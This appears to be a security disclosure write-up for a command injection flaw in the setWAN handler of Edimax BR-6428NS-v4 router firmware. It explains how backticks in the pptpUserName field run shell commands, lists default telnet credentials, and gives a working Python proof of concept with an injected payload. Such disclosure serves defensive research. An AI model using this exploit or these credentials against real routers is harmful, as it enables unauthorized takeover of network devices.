# Command Injection

Execute commands directly on the router via HTTP POST requests.

## Device Information

**Device**: Edimax Wireless Router BR-6428NS-v4

**Firmware Version**: BR-6428NS_v4_1.10

**Firmware Download Link**: https://www.edimax.com/edimax/download/download/data/edimax/global/download/wireless_routers_n300/br-6428ns_v4

![image-20241012150947135](./images/image-20241012150947135.png)

**Emulation Environment**: ubuntu-18.04.6-desktop-amd64 + [FirmAE](https://github.com/pr0v3rbs/FirmAE) + python-3.6.9

**Emulation Command**:

```shell
sudo ./run.sh -r Edimax ~/Desktop/BR-6428NS_v4_1.10.zip
```

![image-20241012151406971](./images/image-20241012151406971.png)

**Router Homepage**:

![image-20241012153525694](./images/image-20241012153525694.png)

**Telnet**:

Username and password: root/edimaxens

![image-20241012153704459](./images/image-20241012153704459.png)

**Vulnerability Location**: Within the squashfs-root system of the firmware package, specifically in the /bin/webs ELF file’s setWAN function.

## Cause of the Vulnerability

The setWAN function accepts arbitrary input for the pptpUserName parameter without validation, which can execute system commands directly using backticks **`**.

Both wanMode and pptpUserName are supplied via front-end POST.

![image-20241012145756591](./images/image-20241012145756591.png)

When **wanMode=3**, it enters the command injection logic.

![image-20241012152835403](./images/image-20241012152835403.png)

## PoC

```python
import requests

command = "touch /tmp/fanxiaoyao"
url = "http://192.168.2.1/goform/setWAN"
data = {
    "wanMode":"3",
    "pptpUserName":f"`{command}`"
}

r = requests.post(url, data=data)
#print(r.text)
```

**Execution Result**:

![image-20241012154823782](./images/image-20241012154823782.png)